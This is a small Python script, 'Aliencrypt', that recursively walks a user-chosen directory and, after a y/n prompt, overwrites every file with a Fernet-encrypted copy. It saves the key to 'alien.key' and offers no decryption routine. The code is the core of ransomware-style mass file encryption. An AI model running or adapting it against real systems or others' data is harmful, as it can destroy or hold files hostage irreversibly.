#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet as fernet

# USER INTERFACE

os.system("clear")

print("             ___       __   __       __  ___ ")
print(" /\  |    | |__  |\ | /  ` |__) \ / |__)  |  ")
print("/~~\ |___ | |___ | \| \__, |  \  |  |     |  ")
print("                                             ")

print("*-----------------------------------------*\n")

path = input("Specify File Path: ")

print("\n")

# FIND ALL FILES THROUGH EVERY DIRECTORY AND ADD THEM TO A LIST

file_bin = []

for root, dirs, files in os.walk(path):
	for file in files:
		if file == "Aliencrypt.py" or file == "Aliencrypt":
			continue
		file_path = os.path.join(root, file)
		file_bin.append(file_path)
		
print(file_bin)

choice = input(f"\nWould you like to encrypt all files and directories in {path}? This action cannot be undone.(y/n): ")

print("\n")

# START ENCRYPTING

key = fernet.generate_key()

f = fernet(key)

if choice == "y":

	with open('alien.key', 'wb') as alien:
		alien.write(key)

	for paper in file_bin:
		with open(paper, 'rb') as thefile:
			contents = thefile.read()
		contents_encrypted = f.encrypt(contents)
		with open(paper, 'wb') as thefile:
			thefile.write(contents_encrypted)

else:
	exit()
